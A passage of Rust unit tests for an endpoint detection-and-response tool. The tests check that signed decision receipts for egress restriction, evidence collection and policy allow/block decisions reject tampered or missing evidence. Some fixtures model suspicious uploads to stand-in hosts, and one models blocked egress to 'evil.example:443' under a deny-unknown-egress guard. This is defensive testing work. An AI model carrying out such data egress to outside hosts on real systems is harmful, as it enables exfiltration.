                event_count: 3,
                changed_count: 2,
                allow_to_block_count: 1,
                track_posture: true,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::Simulation
        );
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.policy_event_impact")
        );
        assert_eq!(
            receipt.graph.graph_slice_id.as_deref(),
            Some(impact_id.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some("policy_event_stream")
        );

        let mut mismatched_graph_slice = receipt.clone();
        mismatched_graph_slice.graph.graph_slice_id = Some("policy_event_impact:other".to_string());
        assert!(mismatched_graph_slice
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact graph slice reference"));

        let mut relabeled_impact_id = receipt.clone();
        relabeled_impact_id.decision.finding_id = Some("policy_event_impact:other".to_string());
        relabeled_impact_id.graph.graph_slice_id = Some("policy_event_impact:other".to_string());
        if let Some(impact_id_evidence) = relabeled_impact_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "impactId")
        {
            *impact_id_evidence =
                EndpointReceiptEvidence::hashed("impactId", "policy_event_impact:other");
        }
        assert!(relabeled_impact_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact id"));

        let mut mismatched_stream_node = receipt.clone();
        mismatched_stream_node.graph.process_node_id = Some("node:process-other".to_string());
        assert!(mismatched_stream_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact stream node reference"));

        let mut missing_stream_graph_node = receipt.clone();
        missing_stream_graph_node.graph.node_ids.clear();
        assert!(missing_stream_graph_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact stream node reference"));

        let mut missing_impact_hash = receipt.clone();
        missing_impact_hash
            .evidence
            .retain(|item| item.key != "impactHash");
        assert!(missing_impact_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact hash evidence"));

        let mut non_boolean_posture = receipt.clone();
        if let Some(posture_evidence) = non_boolean_posture
            .evidence
            .iter_mut()
            .find(|item| item.key == "trackPosture")
        {
            *posture_evidence = EndpointReceiptEvidence::hashed("trackPosture", "maybe");
        }
        assert!(non_boolean_posture
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact posture evidence"));
    }

    #[test]
    fn endpoint_response_metadata_deserialization_rejects_unknown_fields() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "egress.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://egress.example.invalid/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::restrict_egress_execution(
            &process_node_id,
            &subgraph,
            600,
            "restrict observed egress",
        );
        assert_unknown_field_rejected::<EndpointResponsePlan>(
            serde_json::to_value(&plan).unwrap(),
            "shadowTtlSeconds",
        );

        let targets = vec!["egress.example.invalid:443".to_string()];
        let mut execution =
            EndpointResponseExecutionReport::restrict_egress(&plan, &subgraph, &targets).unwrap();
        execution.actor = Some(response_actor("endpoint-1"));
        assert_unknown_field_rejected::<EndpointResponseExecutionReport>(
            serde_json::to_value(&execution).unwrap(),
            "shadowExecutionStatus",
        );
        assert_unknown_field_rejected::<EndpointEvidenceBundleReference>(
            serde_json::to_value(&execution.evidence_bundle).unwrap(),
            "shadowBundleHash",
        );
        assert_unknown_field_rejected::<EndpointResponseExecutionEffect>(
            serde_json::to_value(&execution.effects[0]).unwrap(),
            "shadowEffectTarget",
        );

        let rollback = EndpointResponseRollbackReport::restrict_egress(
            &execution,
            "restore egress",
            execution.completed_at + chrono::Duration::seconds(1),
        )
        .unwrap();
        assert_unknown_field_rejected::<EndpointResponseRollbackReport>(
            serde_json::to_value(&rollback).unwrap(),
            "shadowRollbackStatus",
        );

        let control = EndpointResponseControlCorrelation {
            response_action_id: execution.action_id.clone(),
            delivery_id: Some("delivery:test".to_string()),
            target_kind: "endpoint".to_string(),
            target_id: "endpoint-1".to_string(),
            ack_token_hash: sha256(b"ack-token").to_hex_prefixed(),
            ack_status: "acknowledged".to_string(),
            resulting_state: Some("contained".to_string()),
        };
        assert_unknown_field_rejected::<EndpointResponseControlCorrelation>(
            serde_json::to_value(&control).unwrap(),
            "shadowAckToken",
        );

        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("operator acknowledged response".to_string()),
            execution.completed_at + chrono::Duration::seconds(2),
        )
        .with_control_correlation(Some(control));
        assert_unknown_field_rejected::<EndpointResponseAcknowledgementReport>(
            serde_json::to_value(&acknowledgement).unwrap(),
            "shadowAcknowledgedBy",
        );
    }

    #[test]
    fn endpoint_response_request_receipt_requires_ttl_rollback_and_graph_target() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "egress.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://egress.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::dry_run(
            EndpointDecisionAction::RestrictEgress,
            &process_node_id,
            &subgraph,
            600,
            "contain process tree",
        );
        let keypair = hush_core::Keypair::from_seed(&[11u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 10,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &plan,
                graph: &subgraph,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseRequest
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(600));
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert_eq!(receipt.decision.confidence, Some(1.0));
        assert_eq!(
            receipt.actor.session_id.as_deref(),
            Some("session-response")
        );
        assert_eq!(receipt.actor.posture.as_deref(), Some("restricted"));
        assert!(receipt.evidence.iter().any(|item| item.key == "actorHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "contentHash"));

        let terminate_dry_run_plan = EndpointResponsePlan::dry_run(
            EndpointDecisionAction::TerminateProcessTree,
            &process_node_id,
            &subgraph,
            600,
            "model terminate process tree only",
        );
        let mut terminate_dry_run_receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 11,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &terminate_dry_run_plan,
                graph: &subgraph,
            });
        terminate_dry_run_receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());
        let signed_terminate_dry_run = terminate_dry_run_receipt.sign_with(&keypair).unwrap();
        assert!(
            signed_terminate_dry_run
                .verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()))
                .valid
        );
        assert_eq!(
            terminate_dry_run_receipt.decision.action,
            EndpointDecisionAction::TerminateProcessTree
        );

        let mut terminate_live_plan = terminate_dry_run_plan.clone();
        terminate_live_plan.dry_run = false;
        let terminate_live_ttl = terminate_live_plan.ttl_seconds.to_string();
        terminate_live_plan.action_id = stable_id(
            "response_action",
            [
                terminate_live_plan.root_node_id.as_str(),
                terminate_live_plan.graph_slice_id.as_str(),
                terminate_live_plan.action.as_str(),
                "execute",
                terminate_live_ttl.as_str(),
            ],
        );
        terminate_live_plan.rollback_ref = format!("rollback:{}", terminate_live_plan.action_id);
        let mut terminate_live_receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 12,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &terminate_live_plan,
                graph: &subgraph,
            });
        terminate_live_receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());
        let err = terminate_live_receipt.sign_with(&keypair).unwrap_err();
        assert!(err.to_string().contains("dry-run response requests"));

        let mut missing_actor_context = receipt.clone();
        missing_actor_context.actor.host_id = None;
        missing_actor_context.actor.user_id = None;
        missing_actor_context.actor.session_id = None;
        missing_actor_context.actor.posture = None;
        missing_actor_context.actor.agent_id = None;
        missing_actor_context.actor.workload_id = None;
        missing_actor_context.actor.approval_id = None;
        assert!(missing_actor_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response actor context"));

        let mut missing_actor_hash = receipt.clone();
        missing_actor_hash
            .evidence
            .retain(|item| item.key != "actorHash");
        assert!(missing_actor_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response actor evidence"));

        let mut mismatched_actor_hash = receipt.clone();
        if let Some(actor_hash_evidence) = mismatched_actor_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "actorHash")
        {
            *actor_hash_evidence = EndpointReceiptEvidence::hashed("actorHash", "actor:other");
        }
        assert!(mismatched_actor_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response actor evidence hash"));

        let mut missing_ttl = receipt.clone();
        missing_ttl.decision.ttl_seconds = None;
        assert!(missing_ttl
            .validate()
            .unwrap_err()
            .to_string()
            .contains("ttl"));

        let mut missing_rollback = receipt.clone();
        missing_rollback.decision.rollback_ref = None;
        assert!(missing_rollback
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback"));

        let mut missing_confidence = receipt.clone();
        missing_confidence.decision.confidence = None;
        assert!(missing_confidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("confidence"));

        let mut missing_ttl_evidence = receipt.clone();
        missing_ttl_evidence
            .evidence
            .retain(|item| item.key != "ttlSeconds");
        assert!(missing_ttl_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response ttl evidence"));

        let mut missing_rollback_evidence = receipt.clone();
        missing_rollback_evidence
            .evidence
            .retain(|item| item.key != "rollbackRef");
        assert!(missing_rollback_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response rollback evidence"));

        let mut missing_content_hash_evidence = receipt.clone();
        missing_content_hash_evidence
            .evidence
            .retain(|item| item.key != "contentHash");
        assert!(missing_content_hash_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response graph content hash evidence"));

        let mut mismatched_ttl_evidence = receipt.clone();
        if let Some(ttl_evidence) = mismatched_ttl_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "ttlSeconds")
        {
            *ttl_evidence = EndpointReceiptEvidence::hashed("ttlSeconds", "601");
        }
        assert!(mismatched_ttl_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response ttl evidence hash"));

        let mut mismatched_rollback_evidence = receipt.clone();
        if let Some(rollback_evidence) = mismatched_rollback_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackRef")
        {
            *rollback_evidence = EndpointReceiptEvidence::hashed("rollbackRef", "rollback:other");
        }
        assert!(mismatched_rollback_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response rollback evidence hash"));

        let mut mismatched_content_hash_evidence = receipt.clone();
        if let Some(content_hash_evidence) = mismatched_content_hash_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "contentHash")
        {
            *content_hash_evidence = EndpointReceiptEvidence::hashed("contentHash", "sha256:other");
        }
        assert!(mismatched_content_hash_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response graph content hash evidence hash"));

        let mut relabeled_action_contract = receipt.clone();
        relabeled_action_contract.decision.finding_id = Some("response_action:other".to_string());
        relabeled_action_contract.decision.rollback_ref =
            Some("rollback:response_action:other".to_string());
        if let Some(response_action_id_evidence) = relabeled_action_contract
            .evidence
            .iter_mut()
            .find(|item| item.key == "responseActionId")
        {
            *response_action_id_evidence =
                EndpointReceiptEvidence::hashed("responseActionId", "response_action:other");
        }
        if let Some(rollback_evidence) = relabeled_action_contract
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackRef")
        {
            *rollback_evidence =
                EndpointReceiptEvidence::hashed("rollbackRef", "rollback:response_action:other");
        }
        assert!(relabeled_action_contract
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action id evidence hash"));

        let mut mismatched_dry_run_evidence = receipt.clone();
        if let Some(dry_run_evidence) = mismatched_dry_run_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "dryRun")
        {
            *dry_run_evidence = EndpointReceiptEvidence::hashed("dryRun", "false");
        }
        assert!(mismatched_dry_run_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response dry-run evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(root_node_evidence) = mismatched_root_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response graph root reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response graph slice reference"));

        let mut empty_reason_evidence = receipt.clone();
        if let Some(reason_evidence) = empty_reason_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "reason")
        {
            *reason_evidence = EndpointReceiptEvidence::hashed("reason", "");
        }
        assert!(empty_reason_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response reason evidence"));

        let mut non_response_action = receipt;
        non_response_action.decision.action = EndpointDecisionAction::Observe;
        assert!(non_response_action
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action"));
    }

    #[test]
    fn endpoint_restrict_egress_execution_receipt_binds_targets_and_rollback() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "egress.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://egress.example.invalid/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let targets = vec!["egress.example.invalid:443".to_string()];
        let plan = EndpointResponsePlan::restrict_egress_execution(
            &process_node_id,
            &subgraph,
            600,
            "restrict observed egress",
        );
        let execution =
            EndpointResponseExecutionReport::restrict_egress(&plan, &subgraph, &targets).unwrap();

        assert_eq!(execution.action, EndpointDecisionAction::RestrictEgress);
        assert_eq!(execution.status, EndpointResponseExecutionStatus::Succeeded);
        assert_eq!(execution.effects[0].effect_type, "restrict_egress");
        assert_eq!(
            execution.effects[0].target,
            "egress:egress.example.invalid:443"
        );
        assert_eq!(
            execution.effects[0].artifact.as_deref(),
            Some("egress.example.invalid:443")
        );
        assert_eq!(execution.effects[0].byte_count, Some(1));

        let rollback = EndpointResponseRollbackReport::restrict_egress(
            &execution,
            "restore egress",
            execution.completed_at + chrono::Duration::seconds(1),
        )
        .unwrap();
        assert_eq!(rollback.action, EndpointDecisionAction::RestrictEgress);
        assert_eq!(rollback.effects[0].effect_type, "restore_egress");
        assert_eq!(
            rollback.effects[0].content_hash,
            execution.effects[0].content_hash
        );
        assert_eq!(rollback.effects[0].byte_count, Some(1));
    }

    #[test]
    fn endpoint_policy_decision_receipt_signs_allow_and_block() {
        let keypair = hush_core::Keypair::from_seed(&[18u8; 32]);
        let policy = EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        };
        let sensor_state = EndpointSensorState::single_active_agent("agent-api:test");
        let actor = EndpointDecisionActor {
            endpoint_id: "endpoint-1".to_string(),
            session_id: Some("session-1".to_string()),
            agent_id: Some("agent:codex".to_string()),
            workload_id: Some("local-agent".to_string()),
            ..EndpointDecisionActor::default()
        };
        let details = serde_json::json!({
            "reason": "developer_tool_allowed"
        });
        let mut allowed_receipt =
            EndpointDecisionReceipt::for_policy_decision(EndpointPolicyDecisionReceiptInput {
                local_sequence: 17,
                signer_identity: "local-edr:endpoint-1",
                actor: actor.clone(),
                policy: policy.clone(),
                sensor_state: sensor_state.clone(),
                action_type: "mcp_tool",
                target: "openclaw.list",
                allowed: true,
                guard: Some("developer_tool_allowlist"),
                severity: Some(DetectionSeverity::Info),
                severity_label: Some("info"),
                message: Some("allowed by developer tool allowlist"),
                details: Some(&details),
            });
        allowed_receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = allowed_receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));
        assert!(verification.valid);
        assert_eq!(
            allowed_receipt.receipt_family,
            EndpointDecisionReceiptFamily::PolicyDecision
        );
        assert_eq!(
            allowed_receipt.decision.action,
            EndpointDecisionAction::Allow
        );
        assert!(allowed_receipt.decision.passed);
        assert_eq!(
            allowed_receipt.actor.agent_id.as_deref(),
            Some("agent:codex")
        );

        let mut mismatched_allowed = allowed_receipt.clone();
        if let Some(allowed_evidence) = mismatched_allowed
            .evidence
            .iter_mut()
            .find(|item| item.key == "allowed")
        {
            *allowed_evidence = EndpointReceiptEvidence::hashed("allowed", "false");
        }
        assert!(mismatched_allowed
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy decision allowed evidence hash"));

        let mut mismatched_action_type = allowed_receipt.clone();
        if let Some(action_type_evidence) = mismatched_action_type
            .evidence
            .iter_mut()
            .find(|item| item.key == "actionType")
        {
            *action_type_evidence = EndpointReceiptEvidence::hashed("actionType", "egress");
        }
        assert!(mismatched_action_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy decision action type evidence hash"));

        let mut missing_target = allowed_receipt.clone();
        missing_target.evidence.retain(|item| item.key != "target");
        assert!(missing_target
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy decision target evidence"));

        let mut relabeled_policy_decision_id = allowed_receipt.clone();
        relabeled_policy_decision_id.decision.finding_id =
            Some("policy_decision:other".to_string());
        assert!(relabeled_policy_decision_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy decision id"));

        let mut blocked_receipt =
            EndpointDecisionReceipt::for_policy_decision(EndpointPolicyDecisionReceiptInput {
                local_sequence: 18,
                signer_identity: "local-edr:endpoint-1",
                actor,
                policy,
                sensor_state,
                action_type: "egress",
                target: "evil.example:443",
                allowed: false,
                guard: Some("deny_unknown_egress"),
                severity: Some(DetectionSeverity::High),
                severity_label: Some("high"),
                message: Some("unknown egress blocked"),
                details: None,
            });
        blocked_receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = blocked_receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));
        assert!(verification.valid);
        assert_eq!(
            blocked_receipt.decision.action,
            EndpointDecisionAction::Block
        );
        assert!(!blocked_receipt.decision.passed);
        assert!(blocked_receipt
            .evidence
            .iter()
            .any(|item| item.key == "target"));
    }

    #[test]
    fn endpoint_collect_evidence_execution_receipt_binds_bundle_and_graph() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "evidence.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evidence.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[13u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 12,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseExecution
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(execution.execution_id.as_str())
        );
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(600));
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );

        let mut missing_bundle_content_hash = receipt.clone();
        missing_bundle_content_hash
            .evidence
            .retain(|item| item.key != "evidenceBundleContentHash");
        assert!(missing_bundle_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution evidence bundle content hash evidence"));

        let mut mismatched_bundle_content_hash = receipt.clone();
        if let Some(bundle_content_hash_evidence) = mismatched_bundle_content_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "evidenceBundleContentHash")
        {
            *bundle_content_hash_evidence =
                EndpointReceiptEvidence::hashed("evidenceBundleContentHash", "sha256:other");
        }
        assert!(mismatched_bundle_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution evidence bundle content hash evidence hash"));

        let mut empty_bundle_id = receipt.clone();
        if let Some(bundle_id_evidence) = empty_bundle_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "evidenceBundleId")
        {
            *bundle_id_evidence = EndpointReceiptEvidence::hashed("evidenceBundleId", "");
        }
        assert!(empty_bundle_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution evidence bundle id evidence"));

        let mut mismatched_bundle_id = receipt.clone();
        if let Some(bundle_id_evidence) = mismatched_bundle_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "evidenceBundleId")
        {
            *bundle_id_evidence =
                EndpointReceiptEvidence::hashed("evidenceBundleId", "evidence_bundle:other");
        }
        assert!(mismatched_bundle_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution evidence bundle id evidence hash"));

        let mut relabeled_execution_id = receipt.clone();
        relabeled_execution_id.decision.finding_id = Some("response_execution:other".to_string());
        if let Some(execution_id_evidence) = relabeled_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(relabeled_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution id evidence hash"));

        let mut empty_response_action_id = receipt.clone();
        if let Some(response_action_id) = empty_response_action_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "responseActionId")
        {
            *response_action_id = EndpointReceiptEvidence::hashed("responseActionId", "");
        }
        assert!(empty_response_action_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action id evidence"));

        let mut mismatched_response_action_id = receipt.clone();
        if let Some(response_action_id) = mismatched_response_action_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "responseActionId")
        {
            *response_action_id =
                EndpointReceiptEvidence::hashed("responseActionId", "response_action:other");
        }
        assert!(mismatched_response_action_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action id evidence hash"));

        let mut relabeled_action_contract = receipt.clone();
        relabeled_action_contract.decision.rollback_ref =
            Some("rollback:noop:response_action:other".to_string());
        if let Some(response_action_id) = relabeled_action_contract
            .evidence
            .iter_mut()
            .find(|item| item.key == "responseActionId")
        {
            *response_action_id =
                EndpointReceiptEvidence::hashed("responseActionId", "response_action:other");
        }
        if let Some(rollback_evidence) = relabeled_action_contract
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackRef")
        {
            *rollback_evidence = EndpointReceiptEvidence::hashed(
                "rollbackRef",
                "rollback:noop:response_action:other",
            );
        }
        assert!(relabeled_action_contract
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action id evidence hash"));

        let fake_effect =
            EndpointResponseExecutionEffect::revoke_grant("local_api_auth_token", "sha256:fake");
        let injected_execution_id = response_execution_id_from_effects(
            plan.action_id.as_str(),
            execution.evidence_bundle.bundle_id.as_str(),
            std::slice::from_ref(&fake_effect),
        )
        .unwrap();
        let mut collect_evidence_with_effect = receipt.clone();
        collect_evidence_with_effect.decision.finding_id = Some(injected_execution_id.clone());
        if let Some(execution_id_evidence) = collect_evidence_with_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", &injected_execution_id);
        }
        if let Some(effect_count_evidence) = collect_evidence_with_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "1");
        }
        collect_evidence_with_effect
            .evidence
            .push(EndpointReceiptEvidence::hashed(
                format!("executionEffect:{}", fake_effect.effect_id),
                response_effect_evidence_value(&fake_effect),
            ));
        assert!(collect_evidence_with_effect
            .validate()
            .unwrap_err()
            .to_string()
            .contains("collect evidence execution effect evidence"));

        let mut mismatched_dry_run = receipt;
        if let Some(dry_run_evidence) = mismatched_dry_run
            .evidence
            .iter_mut()
            .find(|item| item.key == "dryRun")
        {
            *dry_run_evidence = EndpointReceiptEvidence::hashed("dryRun", "true");
        }
        assert!(mismatched_dry_run
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution dry-run evidence hash"));

        let mut execution_with_conflicting_actor = execution.clone();
        let mut other_actor = response_actor("endpoint-1");
        other_actor.agent_id = Some("agent-api:other".to_string());
        execution_with_conflicting_actor.actor = Some(other_actor);
        let mismatched_execution_actor = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 12,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution_with_conflicting_actor,
                graph: &subgraph,
            },
        );
        assert!(mismatched_execution_actor
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution actor evidence"));
    }

    #[test]
    fn endpoint_failed_response_execution_receipt_binds_status_reason_and_graph() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-non-network-target.txt".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::restrict_egress_execution(
            &process_node_id,
            &subgraph,
            600,
            "restrict graph egress",
        );
        let execution =
            EndpointResponseExecutionReport::failed(&plan, &subgraph, "no network targets")
                .unwrap_or_else(|err| panic!("failed to build failure report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[31u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 12,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
